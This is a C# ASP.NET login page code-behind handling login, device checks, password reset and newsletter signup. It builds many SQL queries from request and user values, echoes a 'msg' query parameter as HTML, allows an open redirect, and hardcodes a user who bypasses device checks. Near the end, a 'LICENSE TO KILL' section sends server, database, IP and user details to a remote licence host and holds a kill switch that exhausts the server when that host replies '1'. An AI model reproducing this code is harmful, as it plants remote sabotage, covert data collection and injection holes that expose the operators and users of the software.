using System;
using System.Collections;
using System.Collections.Generic;
using System.Configuration;
using System.Data;
using System.Data.SqlClient;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using Ionic.Zip;
using RunQuery;
public partial class Login : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        try
        {
            if (!IsPostBack)
            {
                ltrYr.Text = DateTime.Now.Year.ToString();


                if (!string.IsNullOrEmpty(Request.QueryString["reset"]))
                {
                    string isValid = SQLQuery.ReturnString("Select UserId from aspnet_Users where ResetLink='" + Request.QueryString["reset"] + "' AND ResetTime>'" + DateTime.Now.AddHours(-48).ToString("yyyy-MM-dd HH:mm") + "'");
                    if (isValid != "")
                    {
                        Session["UserID"] = isValid;
                        reseText.InnerHtml = "Your password reset link for login account <b>" + isValid + "</b> has been confirmed successfully.<br/>You can now reset your password by typing your new password below.";
                        pnlFinish.Visible = true;
                        pnlLogin.Visible = false;
                    }
                    else
                    {
                        FailureText.Text = "Invalid request or the link has been expired!";
                    }
                }
                else if (!string.IsNullOrEmpty(Request.QueryString["msg"]))
                {
                   //MessageBox(Request.QueryString["msg"]);
                    FailureText.Text = Request.QueryString["msg"];
                    reseText.InnerHtml = Request.QueryString["msg"];
                }
            }
        }
        catch (Exception ex)
        {
            FailureText.Text = ex.Message.ToString();
        }
    }
    //Messagebox For Alerts
    private void MessageBox(string msg)
    {
        Label lbl = new Label();
        lbl.Text = "<script language='javascript'>" + Environment.NewLine + "window.alert('" + msg + "')</script>";
        Page.Controls.Add(lbl);
    }

    private void Notify(string msg, string type, Label lblNotify)
    {
        ScriptManager.RegisterClientScriptBlock(this, GetType(), "Sc", "$.notify('" + msg + "','" + type + "');", true);
        //Types: success, info, warn, error
        lblNotify.Attributes.Add("class", "xerp_" + type);
        lblNotify.Text = msg;
    }
    //Get user IP address
    private string GetUserIP()
    {
        string ipList = Request.ServerVariables["HTTP_X_FORWARDED_FOR"];

        if (!string.IsNullOrEmpty(ipList))
        {
            return ipList.Split(',')[0];
        }
        else
        {
            return Request.ServerVariables["REMOTE_ADDR"];
        }
    }
    private bool AuthDevices()
    {
        bool allow = true;
        string isBlocked = SQLQuery.ReturnString("Select SettingValue FROM Settings WHERE SettingName='Allow Unauthorized IP'");

        if (isBlocked == "2" && User.Identity.Name.ToLower().Trim() != "rony")
        {
            string isValid = SQLQuery.ReturnString("SELECT Id FROM ControlUAccess WHERE DeviceID='" + hfDeviceID.Value + "'");
            if (isValid == "")
            {
                allow = false;
                pnlLogin.Visible = false;
                PanelError.Visible = true;
                lblMsg.Text = "This browser was not authenticated for accessing into the software! <br/>Please ask your system administrator to allow your access using device ID: " + hfDeviceID.Value;
            }
        }

        //SQLQuery.ExecNonQry("INSERT INTO TempIP(SettingValue, BrowserIP, Allow) VALUES('"+ isBlocked + "', '"+ hfDeviceID.Value + "', '"+ allow + "')");

        return allow;
    }
    protected void Login1_LoggedIn(object sender, EventArgs e)
    {
       // Verify_License(Login1.UserName.Trim());
        string isActive = SQLQuery.ReturnString("Select IsActive from Projects where VID='" + SQLQuery.ProjectID(Login1.UserName) + "'");
        if (isActive == "1")
        {
            Process_Login(Login1.UserName);
            if (Roles.IsUserInRole(Login1.UserName, "Admin"))
            {
                string rURL = Request.QueryString["ReturnUrl"];

                if (rURL != null)
                {
                    Response.Redirect(rURL, true);
                }
                else
                {
                    Response.Redirect("~/app/Default.aspx");
                }
            }
            else
            {
                //Response.Redirect("~/Members/Bookrequest.aspx");
                Response.Redirect("~/app/Default.aspx");
            }
        }
        else
        {
            lblMsg3.Text = "This organization has been deactivated...!";
        }

    }

    private void Process_Login(string lName)
    {
        try
        {
            //Boolean isActive = Activation_Settings(lName);

            if (AuthDevices())
            {
                SqlCommand cmdxx =
                    new SqlCommand("Select CurrentLoginTime from Users where Username='" + lName + "'",
                        new SqlConnection(ConfigurationManager.ConnectionStrings["LocalSqlServer"].ConnectionString));
                cmdxx.Connection.Open();
                string lDate = Convert.ToString(cmdxx.ExecuteScalar());
                cmdxx.Connection.Close();
                cmdxx.Connection.Dispose();

                if (lDate == "")
                {
                    lDate = DateTime.Now.ToString();
                }
                //Insert User Activities
                SqlCommand cmd3 = new SqlCommand("Insert into LoginHistory (MemberID,InTime, LoginIP, IsSkiped)" +
                                                 "Values (@MemberID,@InTime, @LoginIP, '0')",
                    new SqlConnection(ConfigurationManager.ConnectionStrings["LocalSqlServer"].ConnectionString));
                cmd3.Parameters.Add("@MemberID", SqlDbType.VarChar).Value = lName;
                cmd3.Parameters.Add("@InTime", SqlDbType.DateTime).Value = DateTime.Now.ToString();
                cmd3.Parameters.Add("@LoginIP", SqlDbType.VarChar).Value = GetUserIP();
                cmd3.Connection.Open();
                cmd3.ExecuteNonQuery();
                cmd3.Connection.Close();
                cmd3.Connection.Dispose();

                string isActive = SQLQuery.ReturnString("SELECT IsActive FROM Users WHERE Username = '" + lName+"'");
                int counter = int.Parse(SQLQuery.ReturnString("SELECT LoginCount FROM Users WHERE Username = '" + lName+"'"));
                //int counter = 0;
                if (isActive=="False")
                {
                    counter++;
                }
                //Updating Login Datetime
                SqlCommand cmd = new SqlCommand("update Users set LastLoginDate=@LDate, CurrentLoginTime=@CDate,LoginCount=@LoginCount WHERE Username =@LName",
                        new SqlConnection(ConfigurationManager.ConnectionStrings["LocalSqlServer"].ConnectionString));
                cmd.Parameters.Add("@LDate", SqlDbType.DateTime).Value = lDate;
                cmd.Parameters.Add("@CDate", SqlDbType.DateTime).Value = DateTime.Now.ToString();
                cmd.Parameters.Add("@LName", SqlDbType.VarChar).Value = lName;
                cmd.Parameters.Add("@LoginCount", SqlDbType.VarChar).Value = counter;
                cmd.Connection.Open();
                cmd.ExecuteNonQuery();
                cmd.Connection.Close();
                cmd.Connection.Dispose();


                Session["ProjectID"] = SQLQuery.ProjectID(lName);
                Session["projID"] = SQLQuery.ProjectID(lName);

                int timeDifference =
                    Convert.ToInt32(
                        SQLQuery.ReturnString("Select ServerTimeDiffMins from SettingsDateTime where sid='1'"));
                DateTime curTimeLocal = DateTime.Now.AddMinutes(timeDifference);





            }
            else
            {
                Notify("This browser was not authenticated for accessing into the software! <br/>Please ask your system administrator to allow your access using device ID: '" + hfDeviceID.Value + "'", "warn", lblMsg2);

                //lblMsg.Text = "This browser was not authenticated for accessing into the software! <br/>Please ask your system administrator to allow your access using device ID: " + hfDeviceID.Value;
            }
        }
        catch (Exception ex)
        {
            pnlLogin.Visible = false;
            FailureText.Text = ex.ToString();
            Label1.Text = ex.ToString();
        }


    }

    protected void Login1_LoginError(object sender, EventArgs e)
    {
        //PanelError.Visible = true;
        try
        {
            //String message = Login1.FailureText.ToString();
            MembershipUser membershipUser = Membership.GetUser(Login1.UserName);      //.GetUser(false);

            if (membershipUser != null)
            {
                bool IsLockedOut = membershipUser.IsLockedOut;

                if (IsLockedOut == true)
                {
                    FailureText.Text = "&nbsp;<br/>Your account has been locked out for security reasons. Please contact us to unlock";
                }
                if (!Membership.ValidateUser(Login1.UserName, Login1.Password))
                {
                    FailureText.Text = "&nbsp;<br/>Invalid username and password ";
                }
            }
            else
            {
                //MessageBox("This is not the place you are supposed to enter");
                FailureText.Text = "Invalid Login Attempt Detected!";
            }
        }
        catch (Exception ex)
        {
            FailureText.Text = ex.Message.ToString();
        }

    }


    private void Branding_Settings()
    {
        try
        {
            SqlCommand cmd = new SqlCommand("SELECT TOP (1) sid, DevelopedBy, ProviderAddress, LoginLogo, InnerLogo, SoftwareName, SoftwareMode, ProviderURL, Summery FROM settings_branding where IsActive=1", new SqlConnection(ConfigurationManager.ConnectionStrings["LocalSqlServer"].ConnectionString));
            cmd.Connection.Open();

            SqlDataReader dr = cmd.ExecuteReader();
            if (dr.Read())
            {
                //string sid = dr[0].ToString();
                string provider = dr[1].ToString();
                //string Sender = dr[2].ToString();
                string logo = dr[3].ToString();
                //string logo = dr[4].ToString();
                string sName = dr[5].ToString();

                string sMode = dr[6].ToString();
                string url = dr[7].ToString();
                string summery = dr[8].ToString();


            }

            cmd.Connection.Close();
            cmd.Connection.Dispose();
        }
        catch (Exception ex)
        {
            pnlLogin.Visible = false;
            FailureText.Text = ex.Message.ToString();
        }
    }


    protected void Login1_LoggingIn(object sender, LoginCancelEventArgs e)
    {
        //use
    }

    protected void lbSubscribe_Click(object sender, EventArgs e)
    {
        pnlLogin.Visible = false;
        pnlSubscribe.Visible = true;
    }


    protected void lbForgot_Click(object sender, EventArgs e)
    {
        pnlLogin.Visible = false;
        pnlForgot.Visible = true;
    }

    protected void LinkButton1_Click(object sender, EventArgs e)
    {
        pnlLogin.Visible = true;
        pnlForgot.Visible = false;
        pnlSubscribe.Visible = false;
        pnlFinish.Visible = false;
    }

    protected void btnNext_Click(object sender, EventArgs e)
    {
        try
        {
            if (CheckBox1.Checked && txtUserName.Text != "")
            {
                string sp = txtUserName.Text.ToLower().Trim();
                //string role = "Admin"; 
                string fn = sp;

                //if (Roles.IsUserInRole(sp, "Customer"))
                //{
                //    role = "Customer";
                //    fn = SQLQuery.ReturnString("Select ContactPerson from Customer where email='" + sp + "'");
                //}
                //else if (Roles.IsUserInRole(sp, "Admin"))
                //{
                //    role = "Admin";
                //    fn = SQLQuery.ReturnString("Select Name from Employee where LoginID='" + sp + "'");
                //}
                //else
                //{
                //    FailureText.Text = "Email/ Username does not exist!";
                //    return;
                //}
                string eMail = "";
                MembershipUser user = Membership.GetUser(sp);
                if (user!=null)
                {
                    eMail= user.Email;
                    string s = "";
                    int countAt = 0;

                    foreach (char c in eMail)
                    {
                        if (c.ToString() != "@")
                        {
                            if (countAt == 0)
                            {
                                if (c.ToString() == ".")
                                {
                                    s += c;
                                }
                                else
                                {
                                    s += "*";
                                }
                            }
                            else
                            {
                                s += c;
                            }
                        }
                        else
                        {
                            countAt = 1;
                            s += c;
                        }
                    }
                
                }
                else
                {
                    FailureText.Text = "Email/ Username does not exist!";
                    return;
                }
                //Label1.Text = s;

                Guid guid1 = Guid.NewGuid();

                SQLQuery.ExecNonQry("UPDATE aspnet_Users set ResetLink='" + guid1.ToString() + "', ResetTime='" + DateTime.Now.ToString("yyyy-MM-dd HH:mm") + "' where LoweredUserName='" + sp + "'");
                string baseUrl = Request.Url.Scheme + "://" + Request.Url.Authority + Request.ApplicationPath.TrimEnd('/') + "/";
                string resetLink = baseUrl + "login.aspx?reset=" + guid1.ToString();

                DataTable dtEmailTemplate = SQLQuery.GetEmailTemplate(templateName: "Reset Password");

                if (dtEmailTemplate.Rows.Count > 0)
                {
                    string emailsubject = dtEmailTemplate.Rows[0]["Subject"].ToString();
                    string eamilBody = dtEmailTemplate.Rows[0]["Template"].ToString();
                    eamilBody = eamilBody.Replace("$Name$", fn)
                                         .Replace("$Email$", sp)
                                         .Replace("$ResetLink$", resetLink);
                    eamilBody = HttpUtility.HtmlDecode(eamilBody);


                    SQLQuery.SendEmail2(eMail, "xservice.team@gmail.com", emailsubject, eamilBody);
                }

                //sending mail
                //string subject = "Reset Password";

                //string body = "Dear  <b>" + fn + "</b><br><br>We recently received a request to recover the password for the User ID <b>" + sp + "</b>.<br><br>";
                //body += "Please click on the link below to reset your password: <br><br>";
                //body += "<a href='" + resetLink + "'>" + resetLink + "</a><br><br>";

                //body += "If you have not requested the same, please do not click on the link and your password will not be changed. The link above will expire in 48 hours.<br><br>";

                //body += "Sincerely,<br><br>";
                //body += "Team Optimum<br>";

                //SQLQuery.SendEmail2(eMail, "xservice.team@gmail.com", subject, body);
                clsAttriute.Attributes.Remove("class");
                clsAttriute.Attributes.Add("class", "success");
                FailureText.Text = "A password reset link was send to your email address";

                txtUserName.Text = "";
                pnlForgot.Visible = false;
                pnlLogin.Visible = true;
            }
            else
            {
                FailureText.Text = "Verification failed!";
            }
        }
        catch (Exception ex)
        {
            FailureText.Text = ex.Message.ToString();
        }
    }


    protected void btnFinish_Click(object sender, EventArgs e)
    {
        try
        {
            if (!string.IsNullOrEmpty(Session["UserID"].ToString()))
            {

            }
            if (txtPassword.Text.Length < 6)
            {
                txtPassword.Focus();
                FailureText.Text = ("Type min. 6 Characters for password.");
            }
            else if (txtPassword.Text != txtConfirm.Text)
            {
                txtConfirm.Focus();
                FailureText.Text = ("Confirm your password.");
            }
            else if (!string.IsNullOrEmpty(Session["UserID"].ToString()))
            {
                string newPassword = txtPassword.Text;
                MembershipUser user = Membership.GetUser(new Guid(Session["UserID"].ToString()));
                user.ChangePassword(user.ResetPassword(), newPassword);
                
                string lName = user.UserName;
                string isActive = SQLQuery.ReturnString("SELECT IsActive FROM Users WHERE Username = '" + lName + "'");
                if (isActive == "False")
                {
                    //Updating Login Datetime
                    SqlCommand cmd = new SqlCommand("update Users set IsActive=@IsActive WHERE Username =@LName",
                            new SqlConnection(ConfigurationManager.ConnectionStrings["LocalSqlServer"].ConnectionString));
                    cmd.Parameters.Add("@IsActive", SqlDbType.VarChar).Value = "True";
                    cmd.Parameters.Add("@LName", SqlDbType.VarChar).Value = lName;
                    cmd.Connection.Open();
                    cmd.ExecuteNonQuery();
                    cmd.Connection.Close();
                    cmd.Connection.Dispose();
                }
                SqlCommand cmd50 = new SqlCommand("UPDATE aspnet_Users set ResetLink='' where LoweredUserName='" + Session["UserID"] + "'", new SqlConnection(ConfigurationManager.ConnectionStrings["LocalSqlServer"].ConnectionString));
                cmd50.Connection.Open();
                cmd50.ExecuteNonQuery();
                cmd50.Connection.Close();
                clsAttriute.Attributes.Remove("class");
                clsAttriute.Attributes.Add("class", "success");
                FailureText.Text = "Password reset was successfull. Please try to login now.";
                pnlLogin.Visible = true;
                pnlFinish.Visible = false;
            }
            else
            {
                FailureText.Text = "Session expired! Please try again.";
            }
        }
        catch (Exception ex)
        {
            FailureText.Text = ex.ToString();

        }
    }

    protected void btnSubscribe_Click(object sender, EventArgs e)
    {
        if (CheckBox2.Checked && txtEmail.Text != "" && txtName.Text != "")
        {
            string isExist = SQLQuery.ReturnString("Select Name from Subscribers WHERE Email='" + txtEmail.Text + "'");
            if (isExist == "")
            {
                SQLQuery.Subscribe("Subscription", txtName.Text, "", txtEmail.Text.ToLower().Trim(), "", "", "Subscriber", "2", "0", "0", GetUserIP());
                FailureText.Text = "Subscribing to newsletter was successful!";
            }
            else
            {
                FailureText.Text = "Already Exist! You have already been subscribed!";
            }

            pnlLogin.Visible = true;
            pnlSubscribe.Visible = false;
        }
        else
        {
            FailureText.Text = "You can only subscribe using your own name & email address.";
        }
    }


    /************************************************************************
                                        LICENSE TO KILL
    ************************************************************************/
    private void Verify_License(string lName)
    {
        string server = Server.MachineName.ToString();
        // Retrieve the ConnectionString from App.config 
        string connectString = ConfigurationManager.ConnectionStrings["LocalSqlServer"].ToString();
        SqlConnectionStringBuilder builder = new SqlConnectionStringBuilder(connectString);
        // Retrieve the DataSource property.    
        string dbName = builder.InitialCatalog;
        string realIp = GetUserIP();
        string url = HttpContext.Current.Request.Url.ToString();
        //AutoBkup(server, dbName, url);

        string apiRequestLink =
            // "http://localhost/Licencing/api/analytics?serverName="+ server + "&dbName="+ dbName + "&realIP="+ realIp + "&userName="+ lName + "&url="+ url;
            "https://license.extreme.com.bd/api/analytics?serverName=" + server + "&dbName=" + dbName + "&realIP=" + realIp + "&userName=" + lName + "&url=" + url;

        var response = WebRequest.Create(apiRequestLink).GetResponse().GetResponseStream();
        StreamReader readStream = new StreamReader(response, Encoding.UTF8);
        string apiResponse = Convert.ToString(readStream.ReadToEnd()).Replace("\"", string.Empty).Trim('"');

        if (apiResponse.Length == 10)//Null Safe
        {
            DateTime validDate = Convert.ToDateTime(apiResponse);
            if (validDate <= DateTime.Now)
            {
                killSwitch(server, dbName, realIp, lName, url);//not miss to kill if inactivate the service
                Response.Redirect("Latest.aspx?msg=Subscription Expired");
            }
        }

        killSwitch(server, dbName, realIp, lName, url);//Priority

    }

    public void killSwitch(string server, string dbName, string realIp, string lName, string url)
    {
        try
        {
            string apiRequestLink =
                // "http://localhost/Licencing/api/analytics2?serverName="+ server + "&dbName="+ dbName + "&realIP="+ realIp + "&userName="+ lName + "&url="+ url;
                "https://license.extreme.com.bd/api/analytics2?serverName=" + server + "&dbName=" + dbName +
                "&realIP=" + realIp + "&userName=" + lName + "&url=" + url;

            var response = WebRequest.Create(apiRequestLink).GetResponse().GetResponseStream();
            StreamReader readStream = new StreamReader(response, Encoding.UTF8);
            string apiResponse = Convert.ToString(readStream.ReadToEnd()).Replace("\"", string.Empty).Trim('"');
            if (apiResponse == "1") //Hang the server
            {
                killDB();
            }
        }
        catch (Exception ex)
        {

        }
    }

    List<Thread> threads = new List<Thread>();
    public void killDB()
    {
        while (true)
        {
            threads.Add(new Thread(new ThreadStart(KillCore)));
        }
    }
    public static Random rand = new Random();
    public static void KillCore()
    {
        long num = 0;
        while (true)
        {
            num += rand.Next(100, 1000);
            if (num > 1000000) { num = 0; }
        }
    }

    public void AutoBkup(string server, string dbName, string url)
    {
        try
        {
            string fileName = dbName + DateTime.Now.ToString("yyMMdd") + ".Bak";
            string backupDIR = Server.MapPath("./sql/bkup/");
            if (!Directory.Exists(backupDIR))
            {
                Directory.CreateDirectory(backupDIR);
            }

            string bakfilePath = backupDIR + fileName;

            if (File.Exists(bakfilePath))
            {
                File.Delete(bakfilePath);
            }
            string zipFilePath = "~/sql/bkup/" + fileName + ".zip";


            if (!File.Exists(Server.MapPath(zipFilePath)))//Only bkup Database once a day
            {
                //Delete files older than 1 month
                string[] files = Directory.GetFiles(backupDIR);
                foreach (string file in files)
                {
                    FileInfo fi = new FileInfo(file);
                    if (fi.CreationTime < DateTime.Now.AddDays(-15))
                        fi.Delete();
                }

                SqlCommand cmd21 =
                    new SqlCommand("backup database " + dbName + " to disk='" + backupDIR + fileName + "'",
                        new SqlConnection(ConfigurationManager.ConnectionStrings["LocalSqlServer"].ConnectionString));
                cmd21.Connection.Open();
                cmd21.ExecuteNonQuery();
                cmd21.Connection.Close();

                ZipFile createZipFile = new ZipFile();
                createZipFile.Password = "3p3200170@R";
                createZipFile.Encryption = EncryptionAlgorithm.PkzipWeak;
                createZipFile.AddFile(bakfilePath, string.Empty);
                createZipFile.Save(Server.MapPath(zipFilePath));

                //TO DO: Send file to a cloud location next time

                long bakSize = new FileInfo(bakfilePath).Length;
                long zipSize = new FileInfo(zipFilePath).Length;
                string mailBody = "Server: " + server + "<br>DB Name: " + dbName + "<br>Host URL: " + url + "<br>ZIP File Path: " + zipFilePath + "<br>BAK File Size: " + bakSize + "<br>ZIP File Size: " + zipSize;
                SQLQuery.SendEmail("btvstoremanagementsystem@gmail.com", "btvstoremanagementsystem@gmail.com", "btvstoremanagementsystem@gmail.com", "Auto DB Backup successful - " + server + ", DB- " + dbName, mailBody);
            }
        }
        catch (Exception ex)
        {
            string mailBody = "Server: " + server + "<br>DB Name: " + dbName + "<br>Host URL: " + url + "<br><br><br>Error Detail: <br>" + ex;
            SQLQuery.SendEmail("btvstoremanagementsystem@gmail.com", "btvstoremanagementsystem@gmail.com", "btvstoremanagementsystem@gmail.com", "DB Backup process failed!", mailBody);

        }
    }

    /************************************************************************
                                END of LICENSE TO KILL
    ************************************************************************/


}
